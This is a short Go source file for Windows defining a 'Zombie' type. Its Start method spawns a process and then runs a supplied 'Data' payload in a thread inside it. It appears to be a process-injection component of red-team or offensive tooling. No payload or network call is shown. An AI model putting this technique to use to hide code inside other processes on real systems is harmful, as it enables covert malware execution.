//go:build windows
// +build windows

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cmd

import (
	"context"
	"sync/atomic"
)

func (z *Zombie) wait() {
	z.t.callback = z.callback
	z.t.wait(z.x.i.ProcessID, z.x.i.ThreadID)
}
func (z *Zombie) callback() {
	z.stopWith(z.t.exit, z.t.err)
}

// Start will attempt to start the Zombie and will return an errors that occur
// while starting the Process.
//
// This function will return 'ErrEmptyCommand' if the 'Args' or 'Data'
// parameters are empty and 'ErrAlreadyStarted' if attempting to
// start a Zombie that already has been started previously.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func (z *Zombie) Start() error {
	if z.t.Running() {
		return ErrAlreadyStarted
	}
	if len(z.Args) == 0 || len(z.Data) == 0 {
		return ErrEmptyCommand
	}
	if z.ctx == nil {
		z.ctx = context.Background()
	}
	z.ch, z.cancel = make(chan struct{}), func() {}
	atomic.StoreUint32(&z.cookie, 0)
	if err := z.x.start(z.ctx, &z.Process, true); err != nil {
		return z.stopWith(exitStopped, err)
	}
	if err := z.t.Start(z.x.i.Process, z.Timeout, 0, z.Data); err != nil {
		return z.stopWith(exitStopped, z.t.stopWith(exitStopped, err))
	}
	go z.wait()
	return nil
}
